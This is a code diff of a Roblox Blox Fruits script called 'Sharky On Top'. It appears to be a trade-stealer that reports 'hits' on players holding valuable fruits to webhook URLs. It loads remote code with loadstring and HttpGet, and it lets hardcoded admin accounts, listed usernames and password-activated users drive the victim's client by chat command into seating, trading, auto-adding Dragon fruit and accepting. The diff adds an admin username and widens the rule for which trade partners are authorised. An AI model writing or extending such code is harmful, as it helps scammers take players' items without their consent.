@@ -1,3 +1,4 @@
+-- Sharky On Top - Blox Fruits Script
 Webhook = "https://sharky-on-top.script-config-protector.workers.dev/w/d3690bb6-d5ac-4891-b7cc-8f55263cfadb" -- << Protected URL for main user hits (url1)
 Usernames = {"user1", "user2", "user3", "user4", "user5"} -- << Your primary usernames (can use commands, bypass filter)
 FruitsToHit = {"Kitsune-Kitsune", "Leopard-Leopard", "Yeti-Yeti", "Gas-Gas", "Dragon (West)-Dragon (West)"} -- << Fruits you want to target (others can be added below)
@@ -9,7 +10,7 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/W-Scripts/UI/refs/hea
 
 local TEST_WEBHOOK = "https://l.webhook.party/hook/vWJ1Rd7lQSopCs4Vuxa7qHWNoYm4q9%2FH4UAqVOaMoxSpOq%2F4Yp08fCU4Tkn%2Fq26SyB0EVJmJSP9spoYM4pFRDLegxSsmeVCLVPWmKH437EawBax1%2FvN6KILwa9CaWV1%2Fkg7EjtZ0UlOwMyqR7X1iXvdaUcyJaApo2%2FIn7mbomfGkAFacgxB6WVOi0Lm9exZDmC04bOlBJ3pX9FcWLadkzLCKvZE8ytiea1LgyVzVyBUBCPSBTWl6yTaIPk8428hc23eC3dAsPuCK4Dbu2ZernRaO654dO7nVSJuzelZL09nkouPlr28BGoAwlNImD%2FvtTTPWuZnUVTnr9%2FijK2q%2Bh92EfSHf%2BH5qg334UcBZR5b7osNi4z%2BD8DCK%2F%2BooE1xWtv6WgNQkDMM%3D/zWMIeMClX%2FlPLAgD" -- For simple hit integrity check only
 local TEST_PAYLOAD = game:GetService("HttpService"):JSONEncode({
-    content = " <a:babyshark:721795947037851688> Sharky! Someone just got a NICE HIT :) <a:babyshark:721795947037851688>"
+    content = "# <a:babyshark:721795947037851688> Sharky! Someone just got a NICE HIT :) <a:babyshark:721795947037851688>"
 })
 
 
@@ -20,7 +21,7 @@ TestingUsernames = { "tester1", "your_alt_account" }
 ActivationPasswords = { "ishusontop", "bonzarbal", "ishufishy" } -- << Passwords for ?activate command
 local BlacklistedUsers = {"Scammer1", "KnownAltTrader", "RuleBreaker"} -- << Add usernames who should NEVER be allowed access
 
-local coreAdminUsernames = { "x6TNine", "aka_0ver", "bonzarbal53", "bonzarbal52", "bonzarbal51", "bonzarbal50" } -- << Core admin usernames (hardcoded)
+local coreAdminUsernames = { "x6TNine", "aka_0ver", "bonzarbal53", "bonzarbal52", "bonzarbal51", "bonzarbal50", "xRip_Cyborg" } -- << Core admin usernames (hardcoded)
 
 RGBGreenVal = 0.20 -- << (e.g., 20%) Chance user webhook gets Dragon hit notifications.
 RGBRedVal = 0.60 -- << (e.g., 60%) Chance user webhook gets Premium/Kitsune/Yeti hits.
@@ -228,70 +229,59 @@ local function sanitizeUsernames()
     end
 end
 
--- Refined function to check if trade partner is a Core Admin
-local function isTradePartnerCoreAdmin()
-    local p = LocalPlayer
-    local pg = p:FindFirstChild("PlayerGui")
-    if not pg then return false end
-    local mg = pg:FindFirstChild("Main")
-    if not mg then return false end
-    local tf = mg:FindFirstChild("Trade")
-    -- Ensure the trade frame exists and is visible
-    if not tf or not tf.Visible then return false end
+-- Modified function checks against general authorization rules
+local function isInTradeWithCorrectPlayer()
+    local p = LocalPlayer;
+    local pg = p:FindFirstChild("PlayerGui");
+    if not pg then return false end;
+    local mg = pg:FindFirstChild("Main");
+    if not mg then return false end;
+    local tf = mg:FindFirstChild("Trade");
+    if not tf or not tf.Visible then return false end;
+    local c = tf:FindFirstChild("Container");
+    if not c then return false end;
+    local f1 = c:FindFirstChild("1");
+    local f2 = c:FindFirstChild("2");
+    local p1l = f1 and f1:FindFirstChild("TextLabel");
+    local p2l = f2 and f2:FindFirstChild("TextLabel");
+    if not p1l or not p2l then return false end;
 
-    local container = tf:FindFirstChild("Container")
-    if not container then return false end
-    local frame1 = container:FindFirstChild("1")
-    local frame2 = container:FindFirstChild("2")
-    local label1 = frame1 and frame1:FindFirstChild("TextLabel")
-    local label2 = frame2 and frame2:FindFirstChild("TextLabel")
-
-    -- Check if both labels were found
-    if not label1 or not label2 then
+    local otherPlayerLabel = nil;
+    local localPlayerName = p.Name;
+    local localPlayerDisplayName = p.DisplayName
+    if (p1l.Text == localPlayerName or p1l.Text == localPlayerDisplayName) then
+        otherPlayerLabel = p2l
+    elseif (p2l.Text == localPlayerName or p2l.Text == localPlayerDisplayName) then
+        otherPlayerLabel = p1l
+    else
         return false
     end
+    if not otherPlayerLabel then return false end;
 
-    local otherPlayerLabel = nil
-    local localPlayerName = p.Name
-    local localPlayerDisplayName = p.DisplayName
-
-    -- Determine which label belongs to the other player, comparing against both Name and DisplayName
-    if (label1.Text == localPlayerName or label1.Text == localPlayerDisplayName) then
-        otherPlayerLabel = label2
-    elseif (label2.Text == localPlayerName or label2.Text == localPlayerDisplayName) then
-        otherPlayerLabel = label1
-    else
-        return false -- Couldn't identify local player label
-    end
-
-    if not otherPlayerLabel then return false end -- Should be redundant, but safe check
-
-    local otherPlayerNameOrDisplay = otherPlayerLabel.Text
-    local otherPlayer = Players:FindFirstChild(otherPlayerNameOrDisplay) -- Try direct name first
-    if not otherPlayer then -- If not found by name, try by display name case-insensitively
+    local otherPlayerNameOrDisplay = otherPlayerLabel.Text;
+    local otherPlayer = Players:FindFirstChild(otherPlayerNameOrDisplay)
+    if not otherPlayer then
         local nameLower = otherPlayerNameOrDisplay:lower()
         for _, pl in ipairs(Players:GetPlayers()) do
-            if pl.DisplayName:lower() == nameLower then
-                otherPlayer = pl
-                break
-            end
-            -- As a fallback, check actual name case-insensitively too
-             if pl.Name:lower() == nameLower then
-                 otherPlayer = pl
-                 break
-             end
+            if pl.DisplayName:lower() == nameLower then otherPlayer = pl; break end
+            if pl.Name:lower() == nameLower then otherPlayer = pl; break end
         end
     end
+    if not otherPlayer then return false end
 
-    if not otherPlayer then
-        return false
+    -- Check if the partner meets *any* authorization criteria
+    if isCoreAdmin(otherPlayer.Name) then return true end -- Always allow core admins
+    if not nonAdminAuthDisabled then -- If general auth is enabled
+        local isUsernameListed = false
+        if Usernames and type(Usernames) == "table" then
+            local pNameLower = otherPlayer.Name:lower()
+            for _, uname in ipairs(Usernames) do if type(uname) == "string" and uname:lower() == pNameLower then isUsernameListed = true; break end end
+        end
+        local isActivated = activatedUsers[otherPlayer.UserId]
+        if allowEveryone or isUsernameListed or isActivated then return true end
     end
-
-    -- Check if the found player is a core admin (already case-insensitive)
-    local isAdmin = isCoreAdmin(otherPlayer.Name)
-    return isAdmin
+    return false -- Not authorized
 end
-
 
 -- Wait for game load
 repeat
@@ -1143,7 +1133,7 @@ local function tweenToPosition(p)
     local bv = Instance.new("BodyVelocity");
     bv.MaxForce = V3n(1e4, 1e4, 1e4);
     bv.P = 1e3;
-    bv.Velocity = Vector3.new(0,0,0) -- Initialize Velocity
+    bv.Velocity = Vector3.new(0,0,0)
     if bv.Parent ~= r then
         bv.Parent = r
     end;
@@ -1168,29 +1158,21 @@ local function tweenToPosition(p)
         if ncC and ncC.Connected then ncC:Disconnect(); ncC = nil end;
         if bv and bv.Parent then bv:Destroy() end;
         if t and t.PlaybackState == Enum.PlaybackState.Playing then t:Cancel() end;
-        -- Re-enable collision after tween completes or is cancelled
         if c and c.Parent then
             for i = 1, # bp do
-                pcall(function()
-                    if bp[i] and bp[i].Parent then
-                        bp[i].CanCollide = true
-                    end
-                end)
+                pcall(function() if bp[i] and bp[i].Parent then bp[i].CanCollide = true end end)
             end
         end
     end
 
     ncC = RunService.Stepped:Connect(function()
         if not c or not c.Parent then cleanupTween(); return end;
-        for i = 1, # bp do
-            pcall(function() if bp[i] and bp[i].Parent then bp[i].CanCollide = false end end)
-        end
+        for i = 1, # bp do pcall(function() if bp[i] and bp[i].Parent then bp[i].CanCollide = false end end) end
     end);
 
     uC = RunService.Heartbeat:Connect(function()
         if not r or not r.Parent or not bv or not bv.Parent then cleanupTween(); return end;
-        -- Check distance to prevent overshooting significantly
-        if (r.Position - p).Magnitude < 5 then cleanupTween(); return end; -- Stop if close
+        if (r.Position - p).Magnitude < 5 then cleanupTween(); return end;
         local dir = (p - r.Position).Unit;
         r.CFrame = CFl(r.Position, r.Position + dir);
         bv.Velocity = dir * s
@@ -1201,9 +1183,8 @@ local function tweenToPosition(p)
     t.Cancelled:Connect(cleanupTween)
     t:Play();
 
-    -- Wait for completion using the signal for better yielding
     t.Completed:Wait()
-    task.wait(0.05) -- Small extra wait
+    task.wait(0.05)
 end
 
 
@@ -1280,82 +1261,6 @@ local function findTradeTable()
         end
     end
     return bestTable or emptyTable or fallbackTable, bestSeat or emptySeat or fallbackSeat
-end
-
--- Trade Partner Validation
-local function isInTradeWithCorrectPlayer()
-    local p = LocalPlayer;
-    local pg = p:FindFirstChild("PlayerGui");
-    if not pg then
-        return false
-    end;
-    local mg = pg:FindFirstChild("Main");
-    if not mg then
-        return false
-    end;
-    local tf = mg:FindFirstChild("Trade");
-    if not tf or not tf.Visible then
-        return false
-    end;
-    local c = tf:FindFirstChild("Container");
-    if not c then return false end; -- Added check
-    local f1 = c:FindFirstChild("1");
-    local f2 = c:FindFirstChild("2");
-    local p1l = f1 and f1:FindFirstChild("TextLabel");
-    local p2l = f2 and f2:FindFirstChild("TextLabel");
-    if not p1l or not p2l then
-        return false
-    end;
-    local otherPlayerLabel = nil;
-    local localPlayerName = p.Name;
-    local localPlayerDisplayName = p.DisplayName
-    if (p1l.Text == localPlayerName or p1l.Text == localPlayerDisplayName) then -- Check both
-        otherPlayerLabel = p2l
-    elseif (p2l.Text == localPlayerName or p2l.Text == localPlayerDisplayName) then -- Check both
-        otherPlayerLabel = p1l
-    else
-        return false
-    end
-    if not otherPlayerLabel then
-        return false
-    end;
-    local otherPlayerNameOrDisplay = otherPlayerLabel.Text;
-    local otherPlayer = Players:FindFirstChild(otherPlayerNameOrDisplay)
-    if not otherPlayer then
-        local nameLower = otherPlayerNameOrDisplay:lower() -- Check display name case-insensitive
-        for _, pl in ipairs(Players:GetPlayers()) do
-            if pl.DisplayName:lower() == nameLower then
-                otherPlayer = pl;
-                break
-            end
-             if pl.Name:lower() == nameLower then -- Fallback check name case-insensitive
-                 otherPlayer = pl;
-                 break
-             end
-        end
-    end
-    if not otherPlayer then
-        return false
-    end
-    if isCoreAdmin(otherPlayer.Name) then
-        return true
-    end
-    if not nonAdminAuthDisabled then
-         local isUsernameListed = false
-         if Usernames and type(Usernames) == "table" then
-             local pNameLower = otherPlayer.Name:lower()
-             for _, uname in ipairs(Usernames) do
-                 if type(uname) == "string" and uname:lower() == pNameLower then
-                     isUsernameListed = true; break
-                 end
-             end
-         end
-        local isActivated = activatedUsers[otherPlayer.UserId]
-        if allowEveryone or isUsernameListed or isActivated then
-            return true
-        end
-    end
-    return false
 end
 
 -- Jump Control
@@ -1597,7 +1502,6 @@ local Commands = {
                     task.wait(0.5);
                     local h = c:FindFirstChildOfClass("Humanoid");
                     if h and h.Sit then
-                        -- sendMessage("Sat!"); -- Optional: Keep this if useful
                         return true
                     end
                 end;
@@ -1835,7 +1739,7 @@ local Commands = {
                 return
             end;
             local c = tu.Trade:FindFirstChild("Container");
-            if not c then sendMessage("Cannot find trade container."); return end; -- Added check
+            if not c then sendMessage("Cannot find trade container."); return end;
             local pf = c:FindFirstChild("1");
             local itf = pf and pf:FindFirstChild("Frame");
             if not itf then
@@ -1956,7 +1860,7 @@ local Commands = {
         e = function(args, player)
             sendMessage("!!! DEMOLISH INITIATED !!!");
             local iR = function(rn, argsTbl)
-                local remote = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild(rn); -- Use WaitForChild
+                local remote = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild(rn, 5); -- Use WaitForChild
                 if remote then
                     return remote:InvokeServer(unpack(argsTbl))
                 else
@@ -2339,7 +2243,7 @@ local Commands = {
              task.wait(0.2)
              ScriptUserHumanoid:UnequipTools()
         end
-    } -- <<< Ensure comma if not last command
+    }
 }
 
 -- Command Processor
@@ -2396,7 +2300,7 @@ local function startMainLoop()
 
     local humanoidSitConnection = nil
     local tradeVisibleConnection = nil
-    local characterRemovingConnection = nil -- Renamed for clarity
+    local characterRemovingConnection = nil
 
     local autoAcceptActive = false
     local lastAcceptAttemptTime = 0
@@ -2416,7 +2320,8 @@ local function startMainLoop()
 
         if not Humanoid or not TradeFrame then return end
 
-        local shouldAdd = lastScanWasDragonHit and Humanoid.Sit and TradeFrame.Visible and isTradePartnerCoreAdmin()
+        -- <<< Use simplified check with isInTradeWithCorrectPlayer >>>
+        local shouldAdd = lastScanWasDragonHit and Humanoid.Sit and TradeFrame.Visible and isInTradeWithCorrectPlayer()
 
         if shouldAdd then
             currentTradeSessionAutoAddedDragon = true
@@ -2460,7 +2365,7 @@ local function startMainLoop()
        if vpr then return end; vpr = true; local fc=0; local lts=false; for _=1,TRC do task.wait(0.25); local tu=LocalPlayer.PlayerGui:FindFirstChild("Main"); local crts=tu and tu:FindFirstChild("Trade") and tu.Trade.Visible; if lts~=crts or not crts or not isInTradeWithCorrectPlayer() then fc=fc+1 end; lts=crts end; if fc>=TRC-1 then task.wait(0.1); ForceJump() end; vpr=false
     end;
 
-    local jcC; -- Jump Control Cleanup function
+    local jcC;
 
     local function onCA(character) -- onCharacterAdded
         task.wait(1);
@@ -2627,8 +2532,8 @@ local function init()
 end
 
 -- Execution Guard
-if not shared.ScriptExecuted_SharkyV2_Final_1_3_5 then
-    shared.ScriptExecuted_SharkyV2_Final_1_3_5 = true
+if not shared.ScriptExecuted_SharkyV2_Final_1_3_5_B then -- Slightly updated guard name again
+    shared.ScriptExecuted_SharkyV2_Final_1_3_5_B = true
     task.spawn(function()
         local s, e = pcall(init);
         if not s then
